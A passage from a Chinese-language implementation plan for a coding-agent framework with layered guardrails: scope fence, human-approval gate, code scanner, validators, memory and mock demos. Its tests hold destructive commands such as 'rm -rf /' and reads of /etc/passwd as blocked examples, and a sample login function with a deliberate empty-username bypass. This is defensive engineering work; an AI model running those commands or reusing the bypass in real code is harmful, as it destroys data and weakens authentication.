    # Task 5 评审发现：Path(ws) / "/abs" 会逃逸到盘根（Windows）
    action = Action(name="read_file", parameters={"path": "/etc/passwd"})
    assert fence.check(action).blocked


def test_fence_blocks_cross_drive_path(fence, tmp_path):
    # Task 5 评审发现：Path('C:/ws') / 'D:/evil.txt' → 'D:/evil.txt'（跨盘符替换 workspace）
    other_drive = str(tmp_path).replace("C:", "D:") + "/evil.txt"
    action = Action(name="read_file", parameters={"path": other_drive})
    assert fence.check(action).blocked
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_guardrails.py -v -k fence`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 scope_fence.py**

```python
"""L2 guardrail: workspace scope fence. All file ops must stay inside workspace."""

from pathlib import Path

from safe_swe_lite.agent.protocol import Action
from safe_swe_lite.guardrails.checker import GuardrailDecision

FILE_ACTIONS = {"read_file", "write_file", "edit_file", "search_pattern", "list_files"}


class ScopeFence:
    def __init__(self, workspace: Path):
        self.workspace = Path(workspace).resolve()

    def check(self, action: Action) -> GuardrailDecision:
        if action.name not in FILE_ACTIONS:
            return GuardrailDecision(blocked=False)
        path_param = action.parameters.get("path", "")
        if not path_param:
            return GuardrailDecision(blocked=False)  # list_files 无需 path
        candidate = (self.workspace / path_param).resolve()
        if not candidate.is_relative_to(self.workspace):
            return GuardrailDecision(
                blocked=True, layer=2,
                reason=f"path '{path_param}' escapes workspace '{self.workspace}'",
            )
        return GuardrailDecision(blocked=False)
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_guardrails.py -v -k fence`
Expected: 5 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/guardrails/scope_fence.py tests/test_guardrails.py
git commit -m "feat: L2 scope fence blocks workspace-escape file paths"
```

---

## Task 8: 护栏 L3 — HITL 状态机

**Files:**
- Create: `src/safe_swe_lite/guardrails/hitl.py`，追加 `tests/test_guardrails.py`

- [ ] **Step 1: 追加失败测试**

```python
# tests/test_guardrails.py — L3 部分追加
from safe_swe_lite.guardrails.hitl import HitlGate, HitlState

REQUIRE_APPROVAL = ["git push", "pip install", "npm publish", "kubectl delete"]


@pytest.fixture
def gate():
    return HitlGate(require_approval=REQUIRE_APPROVAL)


def test_gate_flags_git_push_for_approval(gate):
    action = Action(name="run_command", parameters={"command": "git push origin main"})
    decision = gate.check(action)
    assert decision.blocked and decision.hitl_state == HitlState.PENDING


def test_gate_passes_pytest_without_approval(gate):
    action = Action(name="run_command", parameters={"command": "pytest -q"})
    decision = gate.check(action)
    assert not decision.blocked and decision.hitl_state == HitlState.NO_INTERVENTION


def test_gate_approve_transitions_to_approved(gate):
    action = Action(name="run_command", parameters={"command": "git push origin main"})
    gate.check(action)
    decision = gate.approve()
    assert decision.blocked is False and decision.hitl_state == HitlState.APPROVED


def test_gate_reject_transitions_to_rejected(gate):
    action = Action(name="run_command", parameters={"command": "git push origin main"})
    gate.check(action)
    decision = gate.reject()
    assert decision.blocked and decision.hitl_state == HitlState.REJECTED


def test_gate_auto_decide_for_mock_mode(gate):
    action = Action(name="run_command", parameters={"command": "git push origin main"})
    decision = gate.check(action, auto_approve=True)
    assert not decision.blocked and decision.hitl_state == HitlState.APPROVED
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_guardrails.py -v -k gate`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 hitl.py**

```python
"""L3 guardrail: HITL state machine for actions needing human approval."""

from enum import Enum

from safe_swe_lite.agent.protocol import Action
from safe_swe_lite.guardrails.checker import GuardrailDecision

DEFAULT_REQUIRE_APPROVAL = ["git push", "pip install", "npm publish", "kubectl delete", "rm "]


class HitlState(str, Enum):
    NO_INTERVENTION = "no_intervention"
    PENDING = "pending"
    APPROVED = "approved"
    REJECTED = "rejected"


class HitlGate:
    def __init__(self, require_approval=None):
        self.require_approval = require_approval or DEFAULT_REQUIRE_APPROVAL
        self._pending_action = None

    def check(self, action: Action, auto_approve: bool = False) -> GuardrailDecision:
        if action.name != "run_command":
            return GuardrailDecision(blocked=False, hitl_state=HitlState.NO_INTERVENTION)
        command = action.parameters.get("command", "")
        if not any(command.startswith(p) for p in self.require_approval):
            return GuardrailDecision(blocked=False, hitl_state=HitlState.NO_INTERVENTION)
        self._pending_action = action
        if auto_approve:
            return GuardrailDecision(blocked=False, layer=3, hitl_state=HitlState.APPROVED,
                                     reason="auto-approved (mock mode)")
        return GuardrailDecision(blocked=True, layer=3, hitl_state=HitlState.PENDING,
                                 reason=f"'{command}' requires human approval")

    def approve(self) -> GuardrailDecision:
        return GuardrailDecision(blocked=False, layer=3, hitl_state=HitlState.APPROVED)

    def reject(self) -> GuardrailDecision:
        return GuardrailDecision(blocked=True, layer=3, hitl_state=HitlState.REJECTED,
                                 reason="rejected by human")
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_guardrails.py -v -k gate`
Expected: 5 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/guardrails/hitl.py tests/test_guardrails.py
git commit -m "feat: L3 HITL state machine with mock auto-approve"
```

---

## Task 9: 护栏 L4 — 代码内容扫描

**Files:**
- Create: `src/safe_swe_lite/guardrails/code_scanner.py`，追加 `tests/test_guardrails.py`

- [ ] **Step 1: 追加失败测试**

```python
# tests/test_guardrails.py — L4 部分追加
from safe_swe_lite.guardrails.code_scanner import CodeScanner


@pytest.fixture
def scanner():
    return CodeScanner(banned_symbols=["eval", "exec", "subprocess"])


def test_scanner_blocks_eval_in_python(scanner):
    action = Action(name="write_file", parameters={
        "path": "x.py", "content": "def f(s):\n    return eval(s)\n"})
    decision = scanner.check(action)
    assert decision.blocked and decision.layer == 4 and "eval" in decision.reason


def test_scanner_blocks_subprocess_import(scanner):
    action = Action(name="write_file", parameters={
        "path": "x.py", "content": "import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"})
    assert scanner.check(action).blocked


def test_scanner_allows_clean_code(scanner):
    action = Action(name="write_file", parameters={
        "path": "x.py", "content": "def add(a, b):\n    return a + b\n"})
    assert not scanner.check(action).blocked


def test_scanner_reports_line_number(scanner):
    action = Action(name="write_file", parameters={
        "path": "x.py", "content": "x = 1\ny = 2\nexec('print(3)')\n"})
    decision = scanner.check(action)
    assert decision.blocked and "line 3" in decision.reason


def test_scanner_ignores_non_python_files(scanner):
    action = Action(name="write_file", parameters={
        "path": "notes.txt", "content": "eval is fine in a text file"})
    assert not scanner.check(action).blocked
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_guardrails.py -v -k scanner`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 code_scanner.py**

```python
"""L4 guardrail: scan written file content for banned symbols via AST."""

import ast

from safe_swe_lite.agent.protocol import Action
from safe_swe_lite.guardrails.checker import GuardrailDecision

DEFAULT_BANNED = ["eval", "exec", "subprocess", "pickle.loads", "input"]


class CodeScanner:
    def __init__(self, banned_symbols=None):
        self.banned_symbols = banned_symbols or DEFAULT_BANNED

    def check(self, action: Action) -> GuardrailDecision:
        if action.name not in {"write_file", "edit_file"}:
            return GuardrailDecision(blocked=False)
        path = action.parameters.get("path", "")
        content = action.parameters.get("content", "")
        if not (path.endswith(".py") and content):
            return GuardrailDecision(blocked=False)
        try:
            tree = ast.parse(content)
        except SyntaxError:
            return GuardrailDecision(blocked=False)  # 语法错误交给 feedback 的 lint 处理
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                if node.func.id in self.banned_symbols:
                    return GuardrailDecision(
                        blocked=True, layer=4,
                        reason=f"banned symbol '{node.func.id}' at line {node.lineno}",
                    )
        return GuardrailDecision(blocked=False)
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_guardrails.py -v -k scanner`
Expected: 5 passed

- [ ] **Step 5: 提交全部护栏测试并 commit**

```bash
git add src/safe_swe_lite/guardrails/code_scanner.py tests/test_guardrails.py
git commit -m "feat: L4 code content scanner with AST banned-symbol detection"
```

**护栏组合器**（本 task 末尾追加到 `guardrails/__init__.py`）：

```python
"""Guardrail chain: L1 -> L2 -> L3 -> L4, first block wins."""

from safe_swe_lite.agent.protocol import Action
from safe_swe_lite.guardrails.checker import GuardrailDecision, StaticChecker
from safe_swe_lite.guardrails.code_scanner import CodeScanner
from safe_swe_lite.guardrails.hitl import HitlGate
from safe_swe_lite.guardrails.scope_fence import ScopeFence


class GuardrailChain:
    def __init__(self, workspace, require_approval=None, banned_symbols=None):
        self.layers = [
            StaticChecker(),
            ScopeFence(workspace=workspace),
            HitlGate(require_approval=require_approval),
            CodeScanner(banned_symbols=banned_symbols),
        ]

    def check(self, action: Action, auto_approve: bool = False) -> GuardrailDecision:
        for layer in self.layers:
            if isinstance(layer, HitlGate):
                decision = layer.check(action, auto_approve=auto_approve)
            else:
                decision = layer.check(action)
            if decision.blocked:
                return decision
        return GuardrailDecision(blocked=False)
```

追加测试（`tests/test_guardrails.py` 末尾）：

```python
def test_chain_first_block_wins(tmp_path):
    from safe_swe_lite.guardrails import GuardrailChain
    chain = GuardrailChain(workspace=tmp_path)
    decision = chain.check(Action(name="run_command", parameters={"command": "rm -rf /"}))
    assert decision.blocked and decision.layer == 1
```

Run: `pytest tests/test_guardrails.py -v`
Expected: 全部通过（8 + 5 + 5 + 5 + 1 = 24 passed）

Commit: `git commit -m "feat: guardrail chain combines L1-L4 with first-block-wins"`

---

## Task 10: 反馈闭环 — 校验器链 + 有界重试

**Files:**
- Create: `src/safe_swe_lite/feedback/validators.py`, `src/safe_swe_lite/feedback/loop.py`, `tests/test_feedback.py`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_feedback.py
import pytest

from safe_swe_lite.feedback.validators import (
    ValidationResult, PyCompileValidator, TestValidator, format_for_llm,
)


@pytest.fixture
def tmp_project(tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    (tmp_path / "tests").mkdir()
    (tmp_path / "pyproject.toml").write_text("[project]\nname='sample'\n")
    return tmp_path


def test_compile_validator_passes_clean_file(tmp_project):
    (tmp_project / "src" / "ok.py").write_text("x = 1\n")
    results = PyCompileValidator().run(tmp_project)
    assert results == []  # 无错误


def test_compile_validator_detects_syntax_error(tmp_project):
    bad = tmp_project / "src" / "bad.py"
    bad.write_text("def f(:\n    pass\n")
    results = PyCompileValidator().run(tmp_project)
    assert len(results) == 1
    assert results[0].validator == "compile"
    assert results[0].passed is False
    assert results[0].line is not None


def test_test_validator_catches_failing_test(tmp_project):
    (tmp_project / "tests" / "test_x.py").write_text(
        "def test_truth():\n    assert 1 == 2\n")
    results = TestValidator().run(tmp_project)
    assert any(not r.passed and r.validator == "test" for r in results)


def test_test_validator_passes_when_tests_green(tmp_project):
    (tmp_project / "tests" / "test_x.py").write_text(
        "def test_truth():\n    assert 1 == 1\n")
    results = TestValidator().run(tmp_project)
    assert all(r.passed for r in results)


def test_format_for_llm_has_actionable_structure(tmp_project):
    bad = tmp_project / "src" / "bad.py"
    bad.write_text("def f(:\n    pass\n")
    results = PyCompileValidator().run(tmp_project)
    text = format_for_llm(results)
    assert "Fix all errors" in text
    assert "bad.py" in text
    assert "line" in text
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_feedback.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 validators.py 与 loop.py**

`src/safe_swe_lite/feedback/validators.py`:
```python
"""Deterministic validators: compile -> pytest. Each returns structured results."""

import subprocess
import traceback
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class ValidationResult:
    passed: bool
    validator: str
    file: str | None = None
    line: int | None = None
    message: str = ""
    context: str | None = None
    details: dict | None = None


class PyCompileValidator:
    """Uses py_compile to catch syntax errors deterministically, offline."""

    def run(self, workspace: Path) -> list[ValidationResult]:
        results = []
        for py_file in sorted(workspace.rglob("*.py")):
            try:
                compile(py_file.read_text(encoding="utf-8"), str(py_file), "exec")
            except SyntaxError as e:
                results.append(ValidationResult(
                    passed=False, validator="compile",
                    file=str(py_file.relative_to(workspace)),
                    line=e.lineno,
                    message=f"{type(e).__name__}: {e.msg}",
                ))
        return results


class TestValidator:
    """Runs pytest and parses the short summary deterministically."""

    def run(self, workspace: Path) -> list[ValidationResult]:
        proc = subprocess.run(
            ["python", "-m", "pytest", "-q", "--no-header"],
            cwd=workspace, capture_output=True, text=True, timeout=120,
        )
        if proc.returncode == 0:
            return [ValidationResult(passed=True, validator="test", message="all tests passed")]
        return [ValidationResult(
            passed=False, validator="test", message=proc.stdout[-2000:] or proc.stderr[-2000:],
        )]


def format_for_llm(results: list[ValidationResult]) -> str:
    failed = [r for r in results if not r.passed]
    if not failed:
        return "All validators passed."
    lines = ["## Validation failed — fix the errors below:"]
    for r in failed:
        loc = f"{r.file}:{r.line}" if r.file and r.line else (r.file or "")
        lines.append(f"[{r.validator}] {loc} {r.message}".strip())
    return "\n".join(lines)
```

`src/safe_swe_lite/feedback/loop.py`:
```python
"""Bounded retry loop: validate -> feed back -> retry, max 3 rounds."""

from safe_swe_lite.feedback.validators import ValidationResult, format_for_llm


def run_with_retry(execute_write, model, workspace, max_retries: int = 3) -> list[ValidationResult]:
    """After a write action, validate; on failure feed errors back to the model.

    execute_write(correction_instruction: str) -> None re-invokes the model
    with the error feedback and applies its next edit. Returns the final
    validation results (possibly still failing after max_retries).
    """
    results = _validate(workspace)
    for _ in range(max_retries):
        failed = [r for r in results if not r.passed]
        if not failed:
            return results
        execute_write(format_for_llm(failed))
        results = _validate(workspace)
    return results


def _validate(workspace):
    from safe_swe_lite.feedback.validators import PyCompileValidator, TestValidator
    results = PyCompileValidator().run(workspace)
    results += TestValidator().run(workspace)
    return results
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_feedback.py -v`
Expected: 5 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/feedback/ tests/test_feedback.py
git commit -m "feat: validator chain with structured results and bounded retry loop"
```

---

## Task 11: 记忆 — 评分 + 分级上下文

**Files:**
- Create: `src/safe_swe_lite/memory/scoring.py`, `src/safe_swe_lite/memory/store.py`, `tests/test_memory.py`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_memory.py
import pytest

from safe_swe_lite.memory.scoring import score_observation
from safe_swe_lite.memory.store import MemoryStore


def test_score_guardrail_block_is_max():
    assert score_observation({"kind": "guardrail", "data": {"blocked": True}}) == 10


def test_score_test_failure_high():
    assert score_observation({"kind": "validation", "data": {"passed": False}}) == 9


def test_score_file_read_medium():
    assert score_observation({"kind": "file_read"}) == 5


def test_score_trivial_low():
    assert score_observation({"kind": "command", "data": {"output": "installed"}}) == 1


def test_memory_assemble_keeps_recent_window_raw():
    mem = MemoryStore(recent_window=3)
    for i in range(10):
        mem.add_message({"role": "user", "content": f"msg{i}"})
    assembled = mem.assemble()
    assert "msg9" in str(assembled)
    assert "msg0" not in str(assembled)  # 远古消息被摘要替代


def test_memory_assemble_contains_summary_of_old():
    mem = MemoryStore(recent_window=2)
    for i in range(5):
        mem.add_message({"role": "user", "content": f"msg{i}"})
    assembled = mem.assemble()
    text = str(assembled)
    assert "summary" in text.lower()


def test_memory_full_history_untouched():
    mem = MemoryStore(recent_window=1)
    for i in range(5):
        mem.add_message({"role": "user", "content": f"msg{i}"})
    assert len(mem.messages) == 5  # 全量保留，assemble 只裁剪副本
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_memory.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 scoring.py 与 store.py**

`src/safe_swe_lite/memory/scoring.py`:
```python
"""Deterministic importance scoring for observations."""

SCORES = {
    "guardrail": 10,
    "validation_failed": 9,
    "file_read": 5,
    "command": 1,
}


def score_observation(obs: dict) -> int:
    kind = obs.get("kind", "")
    if kind == "guardrail":
        return 10
    if kind == "validation":
        data = obs.get("data", {})
        return 9 if data.get("passed") is False else 1
    if kind == "file_read":
        return 5
    return SCORES.get(kind, 1)
```

`src/safe_swe_lite/memory/store.py`:
```python
"""Tiered context memory: full history kept; assemble() trims a copy."""

from dataclasses import dataclass, field


@dataclass
class MemoryStore:
    recent_window: int = 10
    messages: list = field(default_factory=list)

    def add_message(self, message: dict) -> None:
        self.messages.append(message)

    def assemble(self) -> list[dict]:
        if len(self.messages) <= self.recent_window:
            return list(self.messages)
        old = self.messages[:-self.recent_window]
        recent = self.messages[-self.recent_window:]
        summary = {
            "role": "user",
            "content": f"[summary of {len(old)} earlier messages] "
                       + " | ".join(self._summarize(m) for m in old[-5:]),
        }
        return [summary, *recent]

    @staticmethod
    def _summarize(m: dict) -> str:
        content = str(m.get("content", ""))
        return content[:80] + ("..." if len(content) > 80 else "")
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_memory.py -v`
Expected: 7 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/memory/ tests/test_memory.py
git commit -m "feat: tiered context memory with deterministic importance scoring"
```

---

## Task 12: 配置系统

**Files:**
- Create: `src/safe_swe_lite/config/loader.py`, `config/default.yaml`, `tests/test_config.py`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_config.py
import pytest
import yaml

from safe_swe_lite.config.loader import Config, load_config


def test_load_default_config():
    config = load_config()
    assert config.max_turns == 50
    assert config.command_timeout == 30
    assert config.model.provider == "mock"


def test_load_custom_yaml(tmp_path):
    yaml_path = tmp_path / "c.yaml"
    yaml_path.write_text(yaml.safe_dump({
        "workspace": "./examples/sample_project",
        "max_turns": 7,
        "model": {"provider": "mock", "mock_outputs": []},
        "guardrails": {"require_approval": ["git push"]},
        "feedback": {"validators": ["compile", "test"], "max_retries": 2},
        "memory": {"recent_window": 5},
    }))
    config = load_config(yaml_path)
    assert config.max_turns == 7
    assert config.feedback.max_retries == 2
    assert config.memory.recent_window == 5


def test_invalid_config_rejected(tmp_path):
    yaml_path = tmp_path / "bad.yaml"
    yaml_path.write_text("max_turns: not-a-number\n")
    with pytest.raises(Exception):
        load_config(yaml_path)


def test_missing_file_falls_back_to_default():
    config = load_config("nonexistent.yaml")
    assert config.max_turns == 50
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_config.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 loader.py 与 default.yaml**

`src/safe_swe_lite/config/loader.py`:
```python
"""YAML config -> Pydantic Config with validation."""

from pathlib import Path

import yaml
from pydantic import BaseModel

DEFAULT_CONFIG_PATH = Path(__file__).resolve().parents[3] / "config" / "default.yaml"


class ModelConfig(BaseModel):
    provider: str = "mock"
    mock_outputs: list = []
    model_name: str = ""


class GuardrailConfig(BaseModel):
    blocklist: list = []
    blocklist_standalone: list = []
    block_unless_regex: dict = {}
    allowed_dirs: list = []
    require_approval: list = []
    banned_symbols: list = []


class FeedbackConfig(BaseModel):
    validators: list = ["compile", "test"]
    max_retries: int = 3


class MemoryConfig(BaseModel):
    recent_window: int = 10
    embedding: bool = False


class Config(BaseModel):
    workspace: str = "./examples/sample_project"
    max_turns: int = 50
    timeout_seconds: int = 600
    command_timeout: int = 30
    model: ModelConfig = ModelConfig()
    guardrails: GuardrailConfig = GuardrailConfig()
    feedback: FeedbackConfig = FeedbackConfig()
    memory: MemoryConfig = MemoryConfig()


def load_config(path: Path | str | None = None) -> Config:
    path = Path(path) if path else DEFAULT_CONFIG_PATH
    if not path.exists():
        return Config()
    data = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    return Config(**data)
```

`config/default.yaml`:
```yaml
workspace: "./examples/sample_project"
max_turns: 50
timeout_seconds: 600
command_timeout: 30

model:
  provider: "mock"
  mock_outputs: []

guardrails:
  require_approval: ["git push", "pip install", "npm publish", "kubectl delete"]
  banned_symbols: ["eval", "exec", "subprocess"]

feedback:
  validators: ["compile", "test"]
  max_retries: 3

memory:
  recent_window: 10
  embedding: false
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_config.py -v`
Expected: 4 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/config/ config/ tests/test_config.py
git commit -m "feat: YAML config loader with pydantic validation"
```

---

## Task 13: CLI

**Files:**
- Create: `src/safe_swe_lite/cli.py`, `tests/test_cli.py`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_cli.py
import json

from safe_swe_lite.cli import run_task_from_file


def test_run_fix_bug_task_with_mock(tmp_path):
    task_file = tmp_path / "task.json"
    task_file.write_text(json.dumps({
        "task": "fix the failing test",
        "workspace": str(tmp_path),
        "mock_outputs": [
            {"message": '{"action": "submit", "parameters": {"result": "done"}}'},
        ],
    }))
    result = run_task_from_file(task_file)
    assert result["exit_status"] == "submitted"
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_cli.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 cli.py**

```python
"""CLI entry point: run / auth / web."""

import argparse
import json
from pathlib import Path

from safe_swe_lite.agent.loop import Agent
from safe_swe_lite.config.loader import load_config
from safe_swe_lite.llm.mock import MockLLM
from safe_swe_lite.tools import Dispatcher


def run_task_from_file(task_file: Path) -> dict:
    task_data = json.loads(Path(task_file).read_text(encoding="utf-8"))
    config = load_config()
    workspace = Path(task_data.get("workspace", config.workspace))
    model = MockLLM(outputs=task_data.get("mock_outputs", []))
    tools = Dispatcher(workspace=workspace)
    agent = Agent(model=model, tools=tools, max_steps=task_data.get("max_steps", config.max_turns))
    return agent.run(task_data["task"])


def main() -> None:
    parser = argparse.ArgumentParser(prog="safe-swe-lite")
    sub = parser.add_subparsers(dest="command", required=True)

    run_p = sub.add_parser("run", help="run a task file with mock LLM")
    run_p.add_argument("task_file", type=Path)

    sub.add_parser("web", help="start the web UI")

    sub.add_parser("auth", help="configure API key (real LLM mode)")

    args = parser.parse_args()
    if args.command == "run":
        result = run_task_from_file(args.task_file)
        print(json.dumps(result, ensure_ascii=False, indent=2, default=str))
    elif args.command == "web":
        from safe_swe_lite.web.app import run_server
        run_server()
    elif args.command == "auth":
        from safe_swe_lite.llm.litellm_provider import auth_command
        auth_command()


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_cli.py -v`
Expected: 1 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/cli.py tests/test_cli.py
git commit -m "feat: CLI with run/web/auth subcommands"
```

---

## Task 14: Sample Project + 三个机制演示（课程 §A.6 硬性要求）

**Files:**
- Create: `examples/sample_project/src/auth.py`, `examples/sample_project/tests/test_auth.py`, `examples/tasks/fix_bug.json`, `examples/tasks/blocked_dangerous_action.json`, `tests/test_mechanism_demos.py`

- [ ] **Step 1: 写 sample project（含 bug 和 failing test）**

`examples/sample_project/src/auth.py`:
```python
def authenticate(username: str, password: str) -> bool:
    if not username:
        return True  # BUG: empty username should be rejected
    return username == "admin" and password == "secret123"
```

`examples/sample_project/tests/test_auth.py`:
```python
from src.auth import authenticate


def test_valid_credentials():
    assert authenticate("admin", "secret123") is True


def test_invalid_credentials():
    assert authenticate("admin", "wrong") is False


def test_empty_username():
    assert authenticate("", "secret123") is False
```

**验证 bug 存在**：`cd examples/sample_project && python -m pytest -q` 应报 `test_empty_username` 失败（1 failed, 2 passed）。

- [ ] **Step 2: 写三个机制演示测试（失败先行）**

```python
# tests/test_mechanism_demos.py
import json
import subprocess
from pathlib import Path

import pytest

from safe_swe_lite.agent.loop import Agent
from safe_swe_lite.agent.protocol import Action
from safe_swe_lite.guardrails import GuardrailChain
from safe_swe_lite.llm.mock import MockLLM
from safe_swe_lite.tools import Dispatcher

REPO_ROOT = Path(__file__).resolve().parents[1]


def test_demo_1_guardrail_blocks_dangerous_action(tmp_path):
    """课程演示①：MockLLM 输出 rm -rf /，护栏拦截，命令未执行。"""
    chain = GuardrailChain(workspace=tmp_path)
    executed = []

    class Tools:
        def execute(self, action):
            executed.append(action)
            return {"output": "ran", "exit_code": 0}

    model = MockLLM(outputs=[
        {"message": '{"action": "run_command", "parameters": {"command": "rm -rf /"}}'},
    ])
    agent = Agent(model=model, tools=Tools(), guardrail=chain, max_steps=5)
    result = agent.run("delete everything")
    assert result["exit_status"] == "max_steps_exceeded"
    assert executed == []  # 命令从未执行


def test_demo_2_feedback_loop_changes_next_action(tmp_path):
    """课程演示②：注入一次失败，agent 收到反馈后改变下一步动作。"""
    calls = []

    class FailingTools:
        def execute(self, action):
            calls.append(action)
            if action.name == "run_command":
                return {"output": "tests failed: AssertionError", "exit_code": 1}
            return {"output": "ok", "exit_code": 0}

    model = MockLLM(outputs=[
        {"message": '{"action": "run_command", "parameters": {"command": "pytest -q"}}'},
        {"message": '{"action": "edit_file", "parameters": {"path": "a.py", "old_string": "x", "new_string": "y"}}'},
        {"message": '{"action": "submit", "parameters": {"result": "fixed"}}'},
    ])
    agent = Agent(model=model, tools=FailingTools(), max_steps=10)
    result = agent.run("fix failing test")
    assert result["exit_status"] == "submitted"
    # 第 2 步必须是修改动作——收到失败反馈后改变了行为
    assert calls[1].name == "edit_file"


def test_demo_3_layered_guardrail_chain(tmp_path):
    """课程演示③（重点维度）：护栏三层完整链路。"""
    chain = GuardrailChain(workspace=tmp_path, banned_symbols=["eval"])
    # L1: 静态黑名单
    d1 = chain.check(Action(name="run_command", parameters={"command": "sudo rm -rf /"}))
    assert d1.blocked and d1.layer == 1
    # L2: 范围围栏
    d2 = chain.check(Action(name="read_file", parameters={"path": "/etc/passwd"}))
    assert d2.blocked and d2.layer == 2
    # L3: HITL 状态机（mock 自动批准放行）
    d3 = chain.check(Action(name="run_command", parameters={"command": "git push origin main"}), auto_approve=True)
    assert not d3.blocked and d3.hitl_state == "approved"
    # L4: 代码内容扫描
    d4 = chain.check(Action(name="write_file", parameters={"path": "x.py", "content": "eval('1')\n"}))
    assert d4.blocked and d4.layer == 4


def test_demo_fix_bug_task_file_runs(tmp_path):
    """任务文件驱动的完整 mock 运行（供 CLI 与 WebUI 复用）。"""
    task = json.loads((REPO_ROOT / "examples/tasks/fix_bug.json").read_text(encoding="utf-8"))
    task["workspace"] = str(tmp_path)
    model = MockLLM(outputs=task["mock_outputs"])
    tools = Dispatcher(workspace=tmp_path)
    agent = Agent(model=model, tools=tools, max_steps=task["max_steps"])
    result = agent.run(task["task"])
    assert result["exit_status"] in ("submitted", "max_steps_exceeded")
```

- [ ] **Step 3: 跑测试确认失败**

Run: `pytest tests/test_mechanism_demos.py -v`
Expected: FAIL（examples/tasks 文件还不存在）

- [ ] **Step 4: 写任务文件**

`examples/tasks/fix_bug.json`:
```json
{
  "task": "Fix the failing test in the sample project. Read the source and tests, find the bug, edit the code, run pytest, and submit when all tests pass.",
  "max_steps": 15,
  "mock_outputs": [
    {"message": "{\"action\": \"list_files\", \"parameters\": {}}"},
    {"message": "{\"action\": \"read_file\", \"parameters\": {\"path\": \"src/auth.py\"}}"},
    {"message": "{\"action\": \"read_file\", \"parameters\": {\"path\": \"tests/test_auth.py\"}}"},
    {"message": "{\"action\": \"run_command\", \"parameters\": {\"command\": \"python -m pytest -q\"}}"},
    {"message": "{\"action\": \"edit_file\", \"parameters\": {\"path\": \"src/auth.py\", \"old_string\": \"if not username:\\n    return True\", \"new_string\": \"if not username:\\n    return False\"}}"},
    {"message": "{\"action\": \"run_command\", \"parameters\": {\"command\": \"python -m pytest -q\"}}"},
    {"message": "{\"action\": \"submit\", \"parameters\": {\"result\": \"fixed empty-username bug\"}}"}
  ]
}
```

`examples/tasks/blocked_dangerous_action.json`:
```json
{
  "task": "Try to delete the entire filesystem.",
  "max_steps": 5,
  "mock_outputs": [
    {"message": "{\"action\": \"run_command\", \"parameters\": {\"command\": \"rm -rf /\"}}"}
  ]
}
```

- [ ] **Step 5: 跑测试确认通过**

Run: `pytest tests/test_mechanism_demos.py -v`
Expected: 4 passed

- [ ] **Step 6: Commit**

```bash
git add examples/ tests/test_mechanism_demos.py
git commit -m "feat: sample project and three mechanism demos (course A.6)"
```

---

## Task 15: WebUI

**Files:**
- Create: `src/safe_swe_lite/web/__init__.py`, `src/safe_swe_lite/web/app.py`, `src/safe_swe_lite/web/static/index.html`, `src/safe_swe_lite/web/static/style.css`, `src/safe_swe_lite/web/static/app.js`, `tests/test_web_app.py`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_web_app.py
from fastapi.testclient import TestClient

from safe_swe_lite.web.app import create_app


def test_health_endpoint():
    client = TestClient(create_app())
    response = client.get("/api/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"


def test_index_served():
    client = TestClient(create_app())
    response = client.get("/")
    assert response.status_code == 200


def test_fix_bug_demo_endpoint_runs_mock():
    client = TestClient(create_app())
    response = client.post("/api/demo/fix-bug")
    assert response.status_code == 200
    data = response.json()
    assert data["exit_status"] in ("submitted", "max_steps_exceeded")
    assert isinstance(data["trace"], list)


def test_blocked_demo_endpoint_blocks_action():
    client = TestClient(create_app())
    response = client.post("/api/demo/blocked")
    assert response.status_code == 200
    data = response.json()
    assert data["exit_status"] == "max_steps_exceeded"
    assert any(t.get("kind") == "guardrail" for t in data["trace"])
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pip install -e ".[web]"` 然后 `pytest tests/test_web_app.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 app.py**

```python
"""FastAPI web app: mock-only demo endpoints + static UI."""

import json
import os
from pathlib import Path

from fastapi import FastAPI
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles

from safe_swe_lite.agent.loop import Agent
from safe_swe_lite.guardrails import GuardrailChain
from safe_swe_lite.llm.mock import MockLLM
from safe_swe_lite.tools import Dispatcher

REPO_ROOT = Path(__file__).resolve().parents[3]
STATIC_DIR = Path(__file__).resolve().parent / "static"

# 线上强制 mock：真实 LLM 需显式开启
